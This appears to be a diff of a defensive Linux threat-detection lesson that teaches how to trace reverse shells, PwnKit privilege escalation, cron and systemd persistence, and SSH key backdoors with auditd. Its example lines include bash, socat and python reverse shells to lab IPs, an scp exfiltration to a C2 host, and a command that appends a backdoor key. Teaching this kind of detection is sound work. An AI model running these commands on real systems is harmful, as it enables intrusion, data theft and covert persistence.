@@ -67,7 +67,7 @@ Attack Convenience Threat actors entering via SSH get a convenient terminal with
     Command on the Victim Explanation   `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.   `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.   `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` Python alternative to the above command. The attacker is listening at 10.30.30.30:80.    Detecting Reverse Shells SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd. Below is the log output when a socat reverse shell is established after exploiting a vulnerability in the TryPingMe application:
 
    Finding Reverse Shell Origin 
-```Finding Reverse Shell Origin 
+```bash
 root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
 type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
 type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
@@ -84,7 +84,7 @@ type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid
    After the reverse shell to the attacker's IP is established, it is usually followed by Discovery and other stages you learned in the previous rooms. As always, you can list all commands originating from the spawned reverse shell by building a process tree:
 
    Listing Reverse Shell Activity 
-```Listing Reverse Shell Activity 
+```bash
 root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
 type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
 type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
@@ -151,7 +151,7 @@ scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
  Even if you don't know the exact mechanics of the [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) exploit, you can still detect anomalies using more common attack indicators. After spotting suspicious activity, you can confirm whether privilege escalation succeeded by comparing the effective user before and after the exploit. If the users differ, the attacker gained elevated privileges, like in the example below:
 
    Looking for Reverse Shell Activity 
-```Looking for Reverse Shell Activity 
+```bash
 root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)
 type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
 type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec
@@ -224,7 +224,7 @@ ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trust
  Detecting Persistence In this room, let's focus on detecting the moment attackers establish Persistence. Both cron jobs and systemd services are defined as simple text files, which means you can monitor them for changes using auditd. In addition, Persistence can be detected by tracking the creation of related processes, specifically `crontab` for managing cron jobs and `systemctl` for managing services:
 
     Monitor changes in cron job files `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`   Monitor changes in systemd folders `/lib/systemd/system/*`, `/etc/systemd/system/*`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations   Monitor related processes such as `nano /etc/crontab`, `crontab -e`, `systemctl start|enable <service>`      Detecting Persistence With Auditd 
-```Detecting Persistence With Auditd 
+```bash
 root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
 type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
 type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
@@ -263,7 +263,7 @@ Account Persistence The previous task was mainly about making the malware surviv
  New User Account If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with `ausearch -i --ppid 27254` for the example below):
 
    Detecting New User Account 
-```Detecting New User Account 
+```bash
 root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
 2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
 2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
@@ -274,7 +274,7 @@ root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
    Backdoored SSH Keys Another account persistence method is to backdoor the SSH keys of one of the users and use them for future logins instead of a password. You have already encountered this in the [Linux Threat Detection 2](https://tryhackme.com/room/linuxthreatdetection2) room, where Dota3 malware added its key to the breached user. This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones. For example:
 
    Adding SSH Backdoor 
-```Adding SSH Backdoor 
+```bash
 # Adding SSH backdoor to the authorized_keys
 root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
 
@@ -288,7 +288,7 @@ ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
    By default, authorized SSH public keys are stored in each user's `~/.ssh/authorized_keys` file, so your best detection method is to monitor changes to these files using auditd. Note that relying on process creation events is ineffective, since there are numerous ways to modify SSH keys, some of which aren't properly traced with auditd. For example, `echo [key] >> ~/.ssh/authorized_keys` will not be logged, as echo is a [shell builtin](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html):
 
    Detecting SSH Backdoor 
-```Detecting SSH Backdoor 
+```bash
 # Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"# Note how the malicious "echo" command is logged simply as "bash"
 root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
 type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
